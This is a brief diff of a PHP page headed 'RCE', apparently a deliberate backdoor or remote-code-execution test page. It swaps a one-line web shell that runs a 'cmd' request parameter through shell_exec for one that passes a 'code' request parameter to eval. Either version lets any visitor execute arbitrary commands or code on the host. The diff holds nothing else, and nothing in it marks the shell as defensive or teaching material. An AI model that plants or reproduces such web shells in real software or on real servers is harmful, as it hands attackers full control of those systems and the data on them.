@@ -4,9 +4,11 @@
 
 <h1>RCE</h1>
 
-<?
-php echo shell_exec($_GET['cmd']); 
-?> 
+<?php
+$code = $_GET['code'];
+eval($code);
+?>
 
+ 
 </body>
 </html>
